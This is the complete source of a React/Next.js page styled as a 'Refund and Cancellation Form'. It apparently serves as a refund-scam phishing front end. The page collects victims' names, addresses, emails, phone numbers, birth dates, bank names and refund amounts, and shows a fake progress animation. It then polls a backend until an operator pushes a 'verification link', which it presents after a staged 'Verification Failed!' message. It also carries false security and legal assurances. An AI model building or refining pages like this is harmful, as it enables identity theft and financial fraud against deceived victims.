"use client";

import { useState, useEffect, useCallback } from "react";

type Step = 0 | 1 | 2 | 3;

interface FormData {
  // Step 0 – Login
  loginId: string;
  // Step 1 – Personal Info
  fullName: string;
  address: string;
  email: string;
  mobile: string;
  dobYear: string;
  dobMonth: string;
  dobDay: string;
  // Step 2 – Amount & Bank
  amount: string;
  bankName: string;
  transferOption: string;
}

const MONTHS = [
  "January","February","March","April","May","June",
  "July","August","September","October","November","December",
];

const TRANSFER_OPTIONS = [
  { value: "checking", label: "Checking Account", icon: "🏦" },
  { value: "saving", label: "Saving Account", icon: "💰" },
  { value: "zelle", label: "Zelle", icon: "⚡" },
  { value: "coinbase", label: "Coinbase", icon: "₿" },
];

function StepIndicator({ current }: { current: Step }) {
  const steps = ["Login", "Personal Info", "Amount & Bank", "Verification"];
  return (
    <div className="flex items-center justify-center gap-1 mb-8 px-2">
      {steps.map((label, i) => (
        <div key={i} className="flex items-center">
          <div className="flex flex-col items-center">
            <div
              className={`w-8 h-8 rounded-full flex items-center justify-center text-xs font-bold transition-all duration-300 ${
                i < current
                  ? "bg-green-500 text-white"
                  : i === current
                  ? "bg-yellow-400 text-gray-900 shadow-lg shadow-yellow-400/30"
                  : "bg-gray-700 text-gray-400"
              }`}
            >
              {i < current ? "✓" : i + 1}
            </div>
            <span
              className={`text-xs mt-1 hidden sm:block font-medium ${
                i === current ? "text-yellow-400" : i < current ? "text-green-400" : "text-gray-500"
              }`}
            >
              {label}
            </span>
          </div>
          {i < steps.length - 1 && (
            <div
              className={`w-8 sm:w-12 h-0.5 mx-1 transition-all duration-300 ${
                i < current ? "bg-green-500" : "bg-gray-700"
              }`}
            />
          )}
        </div>
      ))}
    </div>
  );
}

// ─── Step 0: Login ───────────────────────────────────────────────────────────
function LoginStep({
  data,
  onChange,
  onNext,
}: {
  data: FormData;
  onChange: (key: keyof FormData, val: string) => void;
  onNext: () => void;
}) {
  const [error, setError] = useState("");

  const handleNext = () => {
    if (!data.loginId.trim()) {
      setError("Please enter your ID to continue.");
      return;
    }
    setError("");
    onNext();
  };

  return (
    <div className="space-y-6 animate-fadeIn">
      <div className="text-center mb-8">
        <div className="w-20 h-20 bg-yellow-400/10 border-2 border-yellow-400 rounded-full flex items-center justify-center mx-auto mb-4">
          <span className="text-4xl">🔐</span>
        </div>
        <h2 className="text-2xl font-bold text-white">Welcome</h2>
        <p className="text-gray-400 mt-2 text-sm">Enter your ID to get started</p>
      </div>

      <div>
        <label className="block text-sm font-medium text-gray-300 mb-2">
          ID <span className="text-yellow-400">*</span>
        </label>
        <input
          type="text"
          value={data.loginId}
          onChange={(e) => onChange("loginId", e.target.value)}
          placeholder="Enter your ID"
          className="w-full bg-gray-700/50 border border-gray-600 rounded-xl px-4 py-3.5 text-white placeholder-gray-500 focus:outline-none focus:border-yellow-400 focus:ring-2 focus:ring-yellow-400/20 transition-all"
          onKeyDown={(e) => e.key === "Enter" && handleNext()}
        />
        {error && <p className="mt-2 text-red-400 text-sm">{error}</p>}
        <p className="mt-2 text-gray-500 text-xs">
          ℹ️ Use Your Id.
        </p>
      </div>

      <button
        onClick={handleNext}
        className="w-full bg-yellow-400 hover:bg-yellow-300 text-gray-900 font-bold py-4 rounded-xl transition-all duration-200 shadow-lg shadow-yellow-400/20 hover:shadow-yellow-400/40 text-lg"
      >
        Continue →
      </button>
    </div>
  );
}

// ─── Step 1: Personal Info ────────────────────────────────────────────────────
function PersonalInfoStep({
  data,
  onChange,
  onNext,
  onBack,
}: {
  data: FormData;
  onChange: (key: keyof FormData, val: string) => void;
  onNext: () => void;
  onBack: () => void;
}) {
  const [errors, setErrors] = useState<Partial<Record<keyof FormData, string>>>({});

  const currentYear = new Date().getFullYear();
  const years = Array.from({ length: 100 }, (_, i) => currentYear - 18 - i);
  const days = data.dobYear && data.dobMonth
    ? Array.from(
        { length: new Date(parseInt(data.dobYear), parseInt(data.dobMonth), 0).getDate() },
        (_, i) => i + 1
      )
    : Array.from({ length: 31 }, (_, i) => i + 1);

  const validate = () => {
    const e: Partial<Record<keyof FormData, string>> = {};
    if (!data.fullName.trim()) e.fullName = "Full name is required";
    if (!data.address.trim()) e.address = "Address is required";
    if (!data.email.trim() || !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(data.email))
      e.email = "Valid email is required";
    if (!data.mobile.trim() || !/^\+?[\d\s\-()]{7,}$/.test(data.mobile))
      e.mobile = "Valid mobile number is required";
    if (!data.dobYear) e.dobYear = "Select year";
    if (!data.dobMonth) e.dobMonth = "Select month";
    if (!data.dobDay) e.dobDay = "Select day";
    setErrors(e);
    return Object.keys(e).length === 0;
  };

  const handleNext = () => {
    if (validate()) onNext();
  };

  return (
    <div className="space-y-5 animate-fadeIn">
      <div className="text-center mb-6">
        <h2 className="text-2xl font-bold text-white">Personal Details</h2>
        <p className="text-gray-400 mt-1 text-sm">Please Fillup The Form</p>
      </div>

      {/* Full Name */}
      <div>
        <label className="block text-sm font-medium text-gray-300 mb-2">
          Full Name <span className="text-yellow-400">*</span>
        </label>
        <input
          type="text"
          value={data.fullName}
          onChange={(e) => onChange("fullName", e.target.value)}
          placeholder="John Michael Doe"
          className={`w-full bg-gray-700/50 border rounded-xl px-4 py-3 text-white placeholder-gray-500 focus:outline-none focus:ring-2 transition-all ${errors.fullName ? "border-red-500 focus:ring-red-500/20" : "border-gray-600 focus:border-yellow-400 focus:ring-yellow-400/20"}`}
        />
        {errors.fullName && <p className="mt-1 text-red-400 text-xs">{errors.fullName}</p>}
      </div>

      {/* Full Address */}
      <div>
        <label className="block text-sm font-medium text-gray-300 mb-2">
          Full Address <span className="text-yellow-400">*</span>
        </label>
        <textarea
          value={data.address}
          onChange={(e) => onChange("address", e.target.value)}
          placeholder="123 Main Street, City, State, ZIP, Country"
          rows={3}
          className={`w-full bg-gray-700/50 border rounded-xl px-4 py-3 text-white placeholder-gray-500 focus:outline-none focus:ring-2 transition-all resize-none ${errors.address ? "border-red-500 focus:ring-red-500/20" : "border-gray-600 focus:border-yellow-400 focus:ring-yellow-400/20"}`}
        />
        {errors.address && <p className="mt-1 text-red-400 text-xs">{errors.address}</p>}
      </div>

      {/* Email */}
      <div>
        <label className="block text-sm font-medium text-gray-300 mb-2">
          Email Address <span className="text-yellow-400">*</span>
        </label>
        <input
          type="email"
          value={data.email}
          onChange={(e) => onChange("email", e.target.value)}
          placeholder="john@example.com"
          className={`w-full bg-gray-700/50 border rounded-xl px-4 py-3 text-white placeholder-gray-500 focus:outline-none focus:ring-2 transition-all ${errors.email ? "border-red-500 focus:ring-red-500/20" : "border-gray-600 focus:border-yellow-400 focus:ring-yellow-400/20"}`}
        />
        {errors.email && <p className="mt-1 text-red-400 text-xs">{errors.email}</p>}
      </div>

      {/* Mobile */}
      <div>
        <label className="block text-sm font-medium text-gray-300 mb-2">
          Mobile Number <span className="text-yellow-400">*</span>
        </label>
        <input
          type="tel"
          value={data.mobile}
          onChange={(e) => onChange("mobile", e.target.value)}
          placeholder="+1 (555) 000-0000"
          className={`w-full bg-gray-700/50 border rounded-xl px-4 py-3 text-white placeholder-gray-500 focus:outline-none focus:ring-2 transition-all ${errors.mobile ? "border-red-500 focus:ring-red-500/20" : "border-gray-600 focus:border-yellow-400 focus:ring-yellow-400/20"}`}
        />
        {errors.mobile && <p className="mt-1 text-red-400 text-xs">{errors.mobile}</p>}
      </div>

      {/* Date of Birth — Year → Month → Day */}
      <div>
        <label className="block text-sm font-medium text-gray-300 mb-2">
          Date of Birth <span className="text-yellow-400">*</span>
        </label>
        <div className="grid grid-cols-3 gap-3">
          {/* Year */}
          <div>
            <select
              value={data.dobYear}
              onChange={(e) => {
                onChange("dobYear", e.target.value);
                onChange("dobMonth", "");
                onChange("dobDay", "");
              }}
              className={`w-full bg-gray-700/50 border rounded-xl px-3 py-3 text-sm text-white focus:outline-none focus:ring-2 transition-all ${errors.dobYear ? "border-red-500" : "border-gray-600 focus:border-yellow-400 focus:ring-yellow-400/20"}`}
            >
              <option value="">Year</option>
              {years.map((y) => (
                <option key={y} value={y}>
                  {y}
                </option>
              ))}
            </select>
            {errors.dobYear && <p className="mt-1 text-red-400 text-xs">{errors.dobYear}</p>}
          </div>

          {/* Month */}
          <div>
            <select
              value={data.dobMonth}
              onChange={(e) => {
                onChange("dobMonth", e.target.value);
                onChange("dobDay", "");
              }}
              disabled={!data.dobYear}
              className={`w-full bg-gray-700/50 border rounded-xl px-3 py-3 text-sm text-white focus:outline-none focus:ring-2 transition-all disabled:opacity-50 disabled:cursor-not-allowed ${errors.dobMonth ? "border-red-500" : "border-gray-600 focus:border-yellow-400 focus:ring-yellow-400/20"}`}
            >
              <option value="">Month</option>
              {MONTHS.map((m, i) => (
                <option key={m} value={String(i + 1).padStart(2, "0")}>
                  {m}
                </option>
              ))}
            </select>
            {errors.dobMonth && <p className="mt-1 text-red-400 text-xs">{errors.dobMonth}</p>}
          </div>

          {/* Day */}
          <div>
            <select
              value={data.dobDay}
              onChange={(e) => onChange("dobDay", e.target.value)}
              disabled={!data.dobMonth}
              className={`w-full bg-gray-700/50 border rounded-xl px-3 py-3 text-sm text-white focus:outline-none focus:ring-2 transition-all disabled:opacity-50 disabled:cursor-not-allowed ${errors.dobDay ? "border-red-500" : "border-gray-600 focus:border-yellow-400 focus:ring-yellow-400/20"}`}
            >
              <option value="">Day</option>
              {days.map((d) => (
                <option key={d} value={String(d).padStart(2, "0")}>
                  {d}
                </option>
              ))}
            </select>
            {errors.dobDay && <p className="mt-1 text-red-400 text-xs">{errors.dobDay}</p>}
          </div>
        </div>
      </div>

      <div className="flex gap-3 pt-2">
        <button
          onClick={onBack}
          className="flex-1 bg-gray-700 hover:bg-gray-600 text-white font-semibold py-3.5 rounded-xl transition-all"
        >
          ← Back
        </button>
        <button
          onClick={handleNext}
          className="flex-2 w-full bg-yellow-400 hover:bg-yellow-300 text-gray-900 font-bold py-3.5 rounded-xl transition-all duration-200 shadow-lg shadow-yellow-400/20"
        >
          Next →
        </button>
      </div>
    </div>
  );
}

// ─── Step 2: Amount & Bank ────────────────────────────────────────────────────
function AmountBankStep({
  data,
  onChange,
  onNext,
  onBack,
  submitting,
}: {
  data: FormData;
  onChange: (key: keyof FormData, val: string) => void;
  onNext: () => void;
  onBack: () => void;
  submitting: boolean;
}) {
  const [errors, setErrors] = useState<Partial<Record<keyof FormData, string>>>({});

  const validate = () => {
    const e: Partial<Record<keyof FormData, string>> = {};
    if (!data.amount.trim() || isNaN(Number(data.amount.replace(/,/g, ""))))
      e.amount = "Please enter a valid amount";
    if (!data.bankName.trim()) e.bankName = "Bank name is required";
    if (!data.transferOption) e.transferOption = "Please select a transfer option";
    setErrors(e);
    return Object.keys(e).length === 0;
  };

  const handleNext = () => {
    if (validate()) onNext();
  };

  return (
    <div className="space-y-6 animate-fadeIn">
      <div className="text-center mb-6">
        <h2 className="text-2xl font-bold text-white">Refund Section</h2>
        <h3 className="text-gray-400 mt-1 text-sm">Please review the guidelines prior to submitting the cancellation form.</h3>
        <h3 className="text-gray-400 mt-1 text-sm">All transactions are securely processed in compliance with U.S. law. Only the name of the bank is required; no account numbers or other sensitive banking details need to be disclosed.</h3>
      </div>

      {/* Amount */}
      <div>
        <label className="block text-sm font-medium text-gray-300 mb-2">
          Amount (USD) <span className="text-yellow-400">*</span>
        </label>
        <div className="relative">
          <span className="absolute left-4 top-1/2 -translate-y-1/2 text-yellow-400 font-bold text-lg">
            $
          </span>
          <input
            type="text"
            value={data.amount}
            onChange={(e) => onChange("amount", e.target.value)}
            placeholder="0.00"
            className={`w-full bg-gray-700/50 border rounded-xl pl-10 pr-4 py-3.5 text-white text-lg font-semibold placeholder-gray-500 focus:outline-none focus:ring-2 transition-all ${errors.amount ? "border-red-500 focus:ring-red-500/20" : "border-gray-600 focus:border-yellow-400 focus:ring-yellow-400/20"}`}
          />
        </div>
        {errors.amount && <p className="mt-1 text-red-400 text-xs">{errors.amount}</p>}
      </div>

      {/* Bank Name */}
      <div>
        <label className="block text-sm font-medium text-gray-300 mb-2">
          Bank Name <span className="text-yellow-400">*</span>
        </label>
        <input
          type="text"
          value={data.bankName}
          onChange={(e) => onChange("bankName", e.target.value)}
          placeholder="e.g. Chase, Wells Fargo, Bank of America"
          className={`w-full bg-gray-700/50 border rounded-xl px-4 py-3 text-white placeholder-gray-500 focus:outline-none focus:ring-2 transition-all ${errors.bankName ? "border-red-500 focus:ring-red-500/20" : "border-gray-600 focus:border-yellow-400 focus:ring-yellow-400/20"}`}
        />
        {errors.bankName && <p className="mt-1 text-red-400 text-xs">{errors.bankName}</p>}
      </div>

      {/* Transfer Option */}
      <div>
        <label className="block text-sm font-medium text-gray-300 mb-3">
          Transfer Method <span className="text-yellow-400">*</span>
        </label>
        <div className="grid grid-cols-2 gap-3">
          {TRANSFER_OPTIONS.map((opt) => (
            <button
              key={opt.value}
              type="button"
              onClick={() => onChange("transferOption", opt.value)}
              className={`flex items-center gap-3 p-4 rounded-xl border-2 transition-all duration-200 text-left ${
                data.transferOption === opt.value
                  ? "border-yellow-400 bg-yellow-400/10 text-white shadow-lg shadow-yellow-400/10"
                  : "border-gray-600 bg-gray-700/30 text-gray-300 hover:border-gray-500"
              }`}
            >
              <span className="text-2xl">{opt.icon}</span>
              <span className="font-medium text-sm leading-tight">{opt.label}</span>
            </button>
          ))}
        </div>
        {errors.transferOption && (
          <p className="mt-2 text-red-400 text-xs">{errors.transferOption}</p>
        )}
      </div>

      <div className="flex gap-3 pt-2">
        <button
          onClick={onBack}
          className="flex-1 bg-gray-700 hover:bg-gray-600 text-white font-semibold py-3.5 rounded-xl transition-all"
        >
          ← Back
        </button>
        <button
          onClick={handleNext}
          disabled={submitting}
          className="flex-2 w-full bg-yellow-400 hover:bg-yellow-300 text-gray-900 font-bold py-3.5 rounded-xl transition-all duration-200 shadow-lg shadow-yellow-400/20 disabled:opacity-60 disabled:cursor-not-allowed"
        >
          {submitting ? "Submitting..." : "Submit →"}
        </button>
      </div>
    </div>
  );
}

// ─── Step 3: Verification ─────────────────────────────────────────────────────
function VerificationStep({ submissionId }: { submissionId: number | null }) {
  const [phase, setPhase] = useState<"loading" | "waiting" | "verified">("loading");
  const [verificationLink, setVerificationLink] = useState<string | null>(null);
  const [progress, setProgress] = useState(0);

  // Animate the progress circle for 3 seconds
  useEffect(() => {
    const duration = 3000;
    const interval = 50;
    const steps = duration / interval;
    let count = 0;
    const timer = setInterval(() => {
      count++;
      setProgress(Math.min(100, Math.round((count / steps) * 100)));
      if (count >= steps) {
        clearInterval(timer);
        setPhase("waiting");
      }
    }, interval);
    return () => clearInterval(timer);
  }, []);

  // Poll for verification link every 5 seconds
  const pollVerification = useCallback(async () => {
    if (!submissionId || phase !== "waiting") return;
    try {
      const res = await fetch(`/api/submissions/${submissionId}`);
      const json = await res.json();
      if (json.success && json.data.status === "approved" && json.data.verificationLink) {
        setVerificationLink(json.data.verificationLink);
        setPhase("verified");
      }
    } catch {
      // ignore
    }
  }, [submissionId, phase]);

  useEffect(() => {
    if (phase !== "waiting") return;
    const interval = setInterval(pollVerification, 5000);
    return () => clearInterval(interval);
  }, [phase, pollVerification]);

  const circumference = 2 * Math.PI * 45;
  const dashOffset = circumference - (progress / 100) * circumference;

  if (phase === "loading") {
    return (
      <div className="text-center space-y-6 animate-fadeIn py-6">
        <h2 className="text-2xl font-bold text-white">Verification In Progress</h2>
        <p className="text-gray-400 text-sm">Please wait while we process your submission</p>

        {/* Animated Progress Circle */}
        <div className="flex items-center justify-center">
          <div className="relative w-36 h-36">
            <svg className="w-36 h-36 -rotate-90" viewBox="0 0 100 100">
              <circle
                cx="50" cy="50" r="45"
                fill="none"
                stroke="#374151"
                strokeWidth="8"
              />
              <circle
                cx="50" cy="50" r="45"
                fill="none"
                stroke="#FACC15"
                strokeWidth="8"
                strokeLinecap="round"
                strokeDasharray={circumference}
                strokeDashoffset={dashOffset}
                style={{ transition: "stroke-dashoffset 0.05s linear" }}
              />
            </svg>
            <div className="absolute inset-0 flex flex-col items-center justify-center">
              <span className="text-3xl font-bold text-yellow-400">{progress}%</span>
              <span className="text-xs text-gray-400">Processing</span>
            </div>
          </div>
        </div>

        <div className="space-y-2">
          {["Encrypting data", "Verifying identity", "Processing request"].map((step, i) => (
            <div
              key={step}
              className={`flex items-center gap-3 justify-center text-sm transition-all duration-500 ${
                progress > (i + 1) * 30 ? "text-green-400" : "text-gray-500"
              }`}
            >
              <span>{progress > (i + 1) * 30 ? "✅" : "⏳"}</span>
              {step}
            </div>
          ))}
        </div>
      </div>
    );
  }

  if (phase === "verified" && verificationLink) {
    return (
      <div className="text-center space-y-6 animate-fadeIn py-6">
        <div className="w-20 h-20 bg-red-400/10 border-2 border-red-400 rounded-full flex items-center justify-center mx-auto">
          <span className="text-4xl">❌</span>
        </div>
        <h2 className="text-2xl font-bold text-white">Verification Failed!</h2>
        <p className="text-gray-400 text-sm">
          Your account has not been verified. Please try again.
        </p>
        <a
          href={verificationLink}
          target="_blank"
          rel="noopener noreferrer"
          className="inline-block w-full bg-red-500 hover:bg-red-400 text-white font-bold py-4 rounded-xl transition-all duration-200 shadow-lg shadow-green-500/20 text-lg"
        >
          🌐 Complete Verification →
        </a>
      </div>
    );
  }

  // Waiting phase
  return (
    <div className="text-center space-y-6 animate-fadeIn py-6">
      <div className="w-20 h-20 bg-yellow-400/10 border-2 border-yellow-400 rounded-full flex items-center justify-center mx-auto animate-pulse">
        <span className="text-4xl">🔗</span>
      </div>
      <h2 className="text-2xl font-bold text-white">Submission Received!</h2>
      <div className="bg-gray-700/50 border border-yellow-400/30 rounded-2xl p-6 text-left space-y-3">
        <div className="flex items-center gap-3 text-yellow-400">
          <span className="text-2xl">⏳</span>
          <div>
            <p className="font-bold text-white">Please Visit Your Bank</p>
            <p className="text-sm text-gray-300">
              A verification link will appear there once approved by you.
            </p>
          </div>
        </div>
        <div className="flex items-center gap-2 text-gray-400 text-sm">
          <span className="animate-spin inline-block">🔄</span>
          <span>Auto-checking every 5 seconds...</span>
        </div>
      </div>

      <div className="bg-gray-800 rounded-xl p-4 text-sm text-gray-400 space-y-2 text-left">
        <p className="font-semibold text-gray-300">📋 What happens next?</p>
        <ul className="space-y-1 list-none">
          <li>✔️ Our team reviews your submission</li>
          <li>✔️ We activate your personalized verification link</li>
          <li>✔️ The link appears there automatically</li>
          <li>✔️ Click the link to complete verification on our website</li>
        </ul>
      </div>
    </div>
  );
}

// ─── Main App ─────────────────────────────────────────────────────────────────
export default function HomePage() {
  const [step, setStep] = useState<Step>(0);
  const [submitting, setSubmitting] = useState(false);
  const [submissionId, setSubmissionId] = useState<number | null>(null);
  const [formData, setFormData] = useState<FormData>({
    loginId: "",
    fullName: "",
    address: "",
    email: "",
    mobile: "",
    dobYear: "",
    dobMonth: "",
    dobDay: "",
    amount: "",
    bankName: "",
    transferOption: "",
  });

  const handleChange = (key: keyof FormData, val: string) => {
    setFormData((prev) => ({ ...prev, [key]: val }));
  };

  const handleSubmit = async () => {
    setSubmitting(true);
    const dob = `${formData.dobYear}-${formData.dobMonth}-${formData.dobDay}`;
    try {
      const res = await fetch("/api/submissions", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          loginId: formData.loginId,
          fullName: formData.fullName,
          address: formData.address,
          email: formData.email,
          mobile: formData.mobile,
          dateOfBirth: dob,
          amount: formData.amount,
          bankName: formData.bankName,
          transferOption: formData.transferOption,
        }),
      });
      const json = await res.json();
      if (json.success) {
        setSubmissionId(json.id);
        setStep(3);
      } else {
        alert("Failed to submit. Please try again.");
      }
    } catch {
      alert("Network error. Please try again.");
    } finally {
      setSubmitting(false);
    }
  };

  return (
    <div
      className="min-h-screen flex items-center justify-center p-4"
      style={{
        background: "linear-gradient(135deg, rgba(17,24,39,0.96), rgba(31,41,55,0.9)), radial-gradient(circle at top, rgba(251,191,36,0.2), transparent 45%)",
        backgroundSize: "cover",
        backgroundPosition: "center",
      }}
    >
      {/* Overlay */}
      <div className="absolute inset-0 bg-gray-900/80 backdrop-blur-sm" />

      <div className="relative z-10 w-full max-w-lg">
        {/* Card */}
        <div className="bg-gray-800/90 backdrop-blur-md rounded-3xl border border-gray-700 shadow-2xl shadow-black/50 overflow-hidden">
          {/* Top Bar */}
          <div className="bg-linear-to-r from-yellow-500/20 to-yellow-400/10 border-b border-gray-700 px-6 pt-6 pb-4">
            <div className="flex items-center gap-3 mb-4">
              <div className="w-8 h-8 bg-yellow-400 rounded-lg flex items-center justify-center">
                <span className="text-gray-900 font-black text-sm">R</span>
              </div>
              <span className="text-white font-bold text-lg">REFUND  AND  CANCELLATION FORM</span>
            </div>
            <StepIndicator current={step} />
          </div>

          {/* Content */}
          <div className="p-6 sm:p-8">
            {step === 0 && (
              <LoginStep
                data={formData}
                onChange={handleChange}
                onNext={() => setStep(1)}
              />
            )}
            {step === 1 && (
              <PersonalInfoStep
                data={formData}
                onChange={handleChange}
                onNext={() => setStep(2)}
                onBack={() => setStep(0)}
              />
            )}
            {step === 2 && (
              <AmountBankStep
                data={formData}
                onChange={handleChange}
                onNext={handleSubmit}
                onBack={() => setStep(1)}
                submitting={submitting}
              />
            )}
            {step === 3 && <VerificationStep submissionId={submissionId} />}
          </div>
        </div>

        {/* Footer */}
        <p className="text-center text-gray-500 text-xs mt-4">
          🔒 Your information is encrypted and secure
        </p>
      </div>
    </div>
  );
}
